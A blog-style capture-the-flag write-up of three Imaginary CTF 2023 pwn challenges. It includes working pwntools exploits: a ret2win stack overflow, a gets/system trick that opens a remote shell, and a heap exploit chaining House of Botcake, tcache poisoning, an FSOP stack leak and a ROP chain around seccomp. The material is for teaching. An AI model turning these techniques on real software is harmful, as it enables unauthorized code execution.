---
title: Imaginary CTF 2023
author: P0ch1ta
date: 2023-07-24 11:33:00 +0530
categories: [pwning]
tags: [pwning, writeups]
math: true
mermaid: true
---

# Introduction

This week I participated in Imaginary CTF from InfoSecIITR. I managed to solve 3 pwn challenges and 1 forensics challenge which was also related to pwning. Also i was very close to solving the fourth pwning challenge as well.

# Ret2win

```
Description

Can you overflow the buffer and get the flag? (Hint: if your exploit isn't working on the remote server, look into stack alignment)
```

This is a simple ret2win challenge. The source code of the challenge is as follows.

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}

```

Additionally if we run checksec command we get the following results.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Thus we can exploit the buffer overflow in the `gets` function to do the `ret2win`. If you don't have any idea on how to do simple ret2win then I would recommend you to go through my playlist on <a href="https://keksite.in/posts/Introduction-to-pwning-1/">Introduction to pwnning</a>

The exploit is as follows:

```py
from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
# p = elf.process()
p = remote(b"ret2win.chal.imaginaryctf.org", 1337)

# gdb.attach(p,'''
#     init-gef
#     c           
# ''')

p.sendline(b"a"*72 + p64(0x000000000040101a) + p64(elf.sym.win))

p.interactive()
```

# Ret2lose

```
Description

You overflowed the buffer and got the flag... but can you get my other flag? (Remote and binary are the same as in the challenge ret2win, but you have to get a shell this time)
```

This challenge has the exact same binary as the above challenge but in this time we have to get remote shell.

On the first glance this looks like a simple `ret2libc` challenge in which we can leak the `libc` address using the GOT entries but its not so simple. If we try to find the ROPgadgets in the binary we find that the `pop rdi ; ret` gadget in missing. This we cannot get a `libc` leak directly.

## Exploitation Vector

While messing around which the challenge binary I found that if we call the `gets` function, it stores the input somewhere in the `libc`. Interestingly this input is also present in the `rdi` register and thus we can control the `rdi` register.

```py
from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = elf.process()
# p = remote(b"ret2win.chal.imaginaryctf.org", 1337)

gdb.attach(p,'''
    init-gef
    c  
''')

payload = b"a"*72 + p64(elf.plt.gets)
p.sendline(payload)

p.sendline(b"b"*8)

p.interactive()
```

<pre><font color="#585858"><b>───────────────────────────────────────────────────────────────── </b></font><font color="#2AA1B3">registers</font><font color="#585858"><b> ────</b></font>
<font color="#C01C28"><b>$rax   </b></font>: 0x007f1646c1ba80  →  <font color="#A2734C">&quot;bbbbabbb&quot;</font>
<font color="#C01C28"><b>$rbx   </b></font>: 0x0               
<font color="#C01C28"><b>$rcx   </b></font>: 0x007f1646c19aa0  →  0x00000000fbad2088
<font color="#C01C28"><b>$rdx   </b></font>: 0x62626261        
<font color="#C01C28"><b>$rsp   </b></font>: <font color="#A347BA">0x007fff6410dda8</font>  →  <font color="#C01C28">0x00000000401156</font>  →  <font color="#585858"><b>&lt;main+0&gt; endbr64 </b></font>
<font color="#C01C28"><b>$rbp   </b></font>: 0x6161616161616161 (&quot;<font color="#A2734C">aaaaaaaa</font>&quot;?)
<font color="#C01C28"><b>$rsi   </b></font>: 0x62626262        
<font color="#C01C28"><b>$rdi   </b></font>: 0x007f1646c1ba80  →  <font color="#A2734C">&quot;bbbbabbb&quot;</font>
<font color="#C01C28"><b>$rip   </b></font>: 0x0               
<font color="#12488B">$r8    </font>: 0x0               
<font color="#C01C28"><b>$r9    </b></font>: 0x0               
<font color="#12488B">$r10   </font>: 0x77              
<font color="#12488B">$r11   </font>: 0x246             
<font color="#C01C28"><b>$r12   </b></font>: <font color="#A347BA">0x007fff6410dea8</font>  →  <font color="#A347BA">0x007fff6410f188</font>  →  <font color="#A2734C">&quot;/media/sf_E_DRIVE/CTFs/ImaginaryCTF23/ret2lose/vul[...]&quot;</font>
<font color="#C01C28"><b>$r13   </b></font>: <font color="#C01C28">0x00000000401156</font>  →  <font color="#585858"><b>&lt;main+0&gt; endbr64 </b></font>
<font color="#C01C28"><b>$r14   </b></font>: <font color="#C01C28">0x00000000403e18</font>  →  <font color="#C01C28">0x00000000401120</font>  →  <font color="#585858"><b>&lt;__do_global_dtors_aux+0&gt; endbr64 </b></font>
<font color="#C01C28"><b>$r15   </b></font>: 0x007f1646d5b040  →  0x007f1646d5c2e0  →  0x0000000000000000
<font color="#C01C28"><b>$eflags</b></font>: [zero carry parity <b>ADJUST</b> sign trap <b>INTERRUPT</b> direction overflow <b>RESUME</b> virtualx86 identification]
<font color="#12488B">$cs</font>: 0x33 <font color="#12488B">$ss</font>: 0x2b <font color="#12488B">$ds</font>: 0x00 <font color="#12488B">$es</font>: 0x00 <font color="#12488B">$fs</font>: 0x00 <font color="#12488B">$gs</font>: 0x00 
</pre>

Here as we can see the 5th character is one smaller than the sent input. I assume that it might be due to some flag variable present. Now that we have `rdi` control we can just call `system` with `/bin/sh` as argument in the `rdi` register.

```py
from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = elf.process()
p = remote(b"ret2win.chal.imaginaryctf.org", 1337)

# gdb.attach(p,'''
#     init-gef
#     b *0x0000000000401050
#     c  
# ''')

# print(elf.sym)

payload = b"a"*72 + p64(elf.plt.gets) + p64(elf.plt.system)
p.sendline(payload)

p.sendline(b"/bin0sh\x00")

p.interactive()
```

<pre>[<font color="#26A269"><b>+</b></font>] Opening connection to b&apos;ret2win.chal.imaginaryctf.org&apos; on port 1337: Done
[<font color="#12488B"><b>*</b></font>] Switching to interactive mode
== proof-of-work: disabled ==
<font color="#C01C28"><b>$</b></font> ls
chal
flag.txt
the_other_flag_that_you_must_get_a_shell_to_find_8e46414287280e86e0576f0525b7ead0c0780c91.txt
<font color="#C01C28"><b>$</b></font> cat the_other_flag_that_you_must_get_a_shell_to_find_8e46414287280e86e0576f0525b7ead0c0780c91.txt
ictf{ret2libc?_what_libc?}
</pre>

# Mailman

```
Description

I'm sure that my post office is 100% secure! It uses some of the latest software, unlike some of the other post offices out there...

Flag is in ./flag.txt.
```

In this challenge we are give a binary. When we decompile it, we get the following result:

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char **v3; // rax
  int choice; // [rsp+Ch] [rbp-24h] BYREF
  size_t size; // [rsp+10h] [rbp-20h] BYREF
  __int64 v6; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v6 = seccomp_init(0LL, argv, envp);
  seccomp_rule_add(v6, 2147418112LL, 2LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 0LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 1LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 5LL, 0LL);
  seccomp_rule_add(v6, 2147418112LL, 60LL, 0LL);
  seccomp_load(v6);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("Welcome to the post office.");
  puts("Enter your choice below:");
  puts("1. Write a letter");
  puts("2. Send a letter");
  puts("3. Read a letter");
  while ( 1 )
  {
    while ( 1 )
    {
      printf("> ");
      __isoc99_scanf("%d%*c", &choice);
      if ( choice != 3 )
        break;
      v7 = inidx();
      puts((const char *)(&mem)[v7]);
    }
    if ( choice > 3 )
      break;
    if ( choice == 1 )
    {
      v7 = inidx();
      printf("letter size: ");
      __isoc99_scanf("%lu%*c", &size);
      v3 = (char **)malloc(size);
      (&mem)[v7] = v3;
      printf("content: ");
      fgets((char *)(&mem)[v7], size, stdin);
    }
    else
    {
      if ( choice != 2 )
        break;
      v7 = inidx();
      free((&mem)[v7]);
    }
  }
  puts("Invalid choice!");
  _exit(0);
}
```

As we can see, initially we are enabling the `open`, `read`, `write` and `exit` syscalls using seccomp. In this challenge we are storing the heap chunk pointers in the `mem` array. We can allocate upto 16 pointers in the `mem`. In this challenge we can only allocate, read and delete the heap chunks.

## Exploitation Vector

In this challenge, when we free the chunk the pointer to the chunk is not set to `NULL`. Thus this is a direct case of UAF. But here we dont have edit premative thus we need to find some other way.

`House Of Botcake` is the one of the ways in which we can exploit the challenge. In `House of botcake` we first fill the `tcache` with chunks and free a chunk in the `unsorted bin`. We then create a new chunk in order to move the freed chunk from `unsorted bin` into the `tcache`. Then we again free the chunk in the `tcache`. This will cause a `double free`. A sample of this exploit technique can be found <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c">here</a>.

```py
rom pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = remote("mailman.chal.imaginaryctf.org", 1337)
# p = elf.process()
libc = elf.libc

# gdb.attach(p,'''
#     init-gef
#     c
# ''')
           
def defuscate(x,l=64):
    a = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (a & (0xf << i+12 )) >> i+12
        a |= (v1 ^ v2) << i
    return a

def obfuscate(x, adr):
    return x^(adr>>12)

def write_letter(index,size,content):
    p.sendlineafter(b">",b"1")
    p.sendlineafter(b"idx:",str(index).encode())
    p.sendlineafter(b"size:",str(size).encode())
    p.sendlineafter(b"content",content)

def send_letter(index):
    p.sendlineafter(b">",b"2")
    p.sendlineafter(b"idx:",str(index).encode())

def read_letter(index):
    p.sendlineafter(b">",b"3")
    p.sendlineafter(b"idx:",str(index).encode())
    return(p.recvline()[1:-1])

for i in range(7):
    write_letter(i,0x100,b"a"*8)  # tcache chunks
write_letter(8,0x100,b"prev"*8)   # prev chunk
write_letter(9,0x100,b"c"*8)      # actual chunk
write_letter(10,0x90,b"d"*8)      # guard chunk
for i in range(7):
    send_letter(i)
send_letter(9)
send_letter(8)
write_letter(10,0x100,b'a'*8)
send_letter(9)                    # trigger double free
heap_leak = defuscate(u64(read_letter(1).ljust(8,b"\x00")))
libc.address = u64(read_letter(8).ljust(8,b"\x00")) - 0x219ce0
log.critical(f"libc base: {hex(libc.address)}")
log.critical(f"heap leak: {hex(heap_leak)}")

p.interactive()
```

Thus we can create overlapping chunks in order to do `tcache poisoning`. To do that we will first allocate a chunk of size `0x110` and then overwrite the `linked list` of `tcache`. Thus we have arbitrary write. The given version of `libc` is 2.35 this is does not have `__malloc_hook` or `__free_hook`. Thus we need to write shellcode on the stack and get the flag. In this case we can use `FSOP` to get the `stack leak` from `environ`.

<a href="https://ctftime.org/writeup/34812">This</a> writeup is a great source of learning FSOP. Basically we try to write to the `_IO_2_1_stdout_` stream in order to read any arbitrary address we want. To do that we have to write the following data:

```c
fp->_flags = (fp->_flags & ~(_IO_NO_WRITES)) | _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING.
f->_IO_write_ptr = fp->_IO_write_end = f->_IO_buf_end = &environ + 8.
fp->_IO_write_base = &environ.
```

The exploit will be as follows.

```py
from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = remote("mailman.chal.imaginaryctf.org", 1337)
# p = elf.process()
libc = elf.libc

# gdb.attach(p,'''
#     init-gef
#     c
# ''')
           
def defuscate(x,l=64):
    a = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (a & (0xf << i+12 )) >> i+12
        a |= (v1 ^ v2) << i
    return a

def obfuscate(x, adr):
    return x^(adr>>12)

def write_letter(index,size,content):
    p.sendlineafter(b">",b"1")
    p.sendlineafter(b"idx:",str(index).encode())
    p.sendlineafter(b"size:",str(size).encode())
    p.sendlineafter(b"content",content)

def send_letter(index):
    p.sendlineafter(b">",b"2")
    p.sendlineafter(b"idx:",str(index).encode())

def read_letter(index):
    p.sendlineafter(b">",b"3")
    p.sendlineafter(b"idx:",str(index).encode())
    return(p.recvline()[1:-1])

for i in range(7):
    write_letter(i,0x100,b"a"*8)
write_letter(8,0x100,b"prev"*8)
write_letter(9,0x100,b"c"*8)
write_letter(10,0x90,b"d"*8)
for i in range(7):
    send_letter(i)
send_letter(9)
send_letter(8)
write_letter(10,0x100,b'a'*8)
send_letter(9)
heap_leak = defuscate(u64(read_letter(1).ljust(8,b"\x00")))
libc.address = u64(read_letter(8).ljust(8,b"\x00")) - 0x219ce0
log.critical(f"libc base: {hex(libc.address)}")
log.critical(f"heap leak: {hex(heap_leak)}")

write_letter(1,0x130,b"a"*0x108 + p64(0x111) + p64(obfuscate(libc.sym._IO_2_1_stdout_,heap_leak+0x880)))
write_letter(2,0x100,b"a"*8)
environ = libc.sym.environ
payload = p32(0xfbad1800) + p32(0) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8) + p64(0x0)*3
write_letter(3,0x100,payload)
stack_leak = u64(p.recvuntil(b"\x00\x00")[2:].ljust(8,b"\x00"))
log.critical(f"stack leak: {hex(stack_leak)}")
log.critical(f"rip : {hex(stack_leak-0x168)}")

p.interactive()
```

To write the shellcode we will then find the `rip` value and allocate a chunk accordingly so that we can execute shellcode. In my case I was facing some issue allocating chunk to the corresponding `rip` value. Thus I allocated the chunk little before the `rip` and then overwrote the `rip` with shellcode.

Here is the complete exploit

```py
from pwn import *

elf = context.binary = ELF("./vuln",checksec=False)
p = remote("mailman.chal.imaginaryctf.org", 1337)
# p = elf.process()
libc = elf.libc

# gdb.attach(p,'''
#     init-gef
#     c
# ''')
           
def defuscate(x,l=64):
    a = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (a & (0xf << i+12 )) >> i+12
        a |= (v1 ^ v2) << i
    return a

def obfuscate(x, adr):
    return x^(adr>>12)

def write_letter(index,size,content):
    p.sendlineafter(b">",b"1")
    p.sendlineafter(b"idx:",str(index).encode())
    p.sendlineafter(b"size:",str(size).encode())
    p.sendlineafter(b"content",content)

def send_letter(index):
    p.sendlineafter(b">",b"2")
    p.sendlineafter(b"idx:",str(index).encode())

def read_letter(index):
    p.sendlineafter(b">",b"3")
    p.sendlineafter(b"idx:",str(index).encode())
    return(p.recvline()[1:-1])

for i in range(7):
    write_letter(i,0x100,b"a"*8)
write_letter(8,0x100,b"prev"*8)
write_letter(9,0x100,b"c"*8)
write_letter(10,0x90,b"d"*8)
for i in range(7):
    send_letter(i)
send_letter(9)
send_letter(8)
write_letter(10,0x100,b'a'*8)
send_letter(9)
heap_leak = defuscate(u64(read_letter(1).ljust(8,b"\x00")))
libc.address = u64(read_letter(8).ljust(8,b"\x00")) - 0x219ce0
log.critical(f"libc base: {hex(libc.address)}")
log.critical(f"heap leak: {hex(heap_leak)}")

write_letter(1,0x130,b"a"*0x108 + p64(0x111) + p64(obfuscate(libc.sym._IO_2_1_stdout_,heap_leak+0x880)))
write_letter(2,0x100,b"a"*8)
environ = libc.sym.environ
payload = p32(0xfbad1800) + p32(0) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8) + p64(0x0)*3
write_letter(3,0x100,payload)
stack_leak = u64(p.recvuntil(b"\x00\x00")[2:].ljust(8,b"\x00"))
log.critical(f"stack leak: {hex(stack_leak)}")
log.critical(f"rip : {hex(stack_leak-0x168)}")

send_letter(1)
send_letter(2)
write_letter(1,0x130,b"a"*0x108 + p64(0x111) + p64(obfuscate(stack_leak-0x188,heap_leak+0x880)))
write_letter(2,0x100,b"./flag.txt\x00")
# pause()

flag = heap_leak + 0x880
flag_buffer = heap_leak + 0x8e4
print(hex(flag))
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rax = libc.address + 0x0000000000045eb0
pop_rdx_r12 = libc.address + 0x000000000011f497
syscall = libc.address + 0x0000000000091396
payload = b"a"*40 + p64(pop_rdi) + p64(flag) + p64(pop_rax) + p64(0x2) + p64(pop_rsi) + p64(0x0) + p64(syscall) 
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag + 100) + p64(pop_rdx_r12) + p64(0x100) + p64(0x0) + p64(libc.sym.read)
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi) +  p64(flag_buffer) + p64(pop_rdx_r12) + p64(0x100) + p64(0x0) + p64(syscall)
# payload += p64(0xdeadbeef)
write_letter(3,0x100,payload)
# _IO_FILE

p.interactive()
```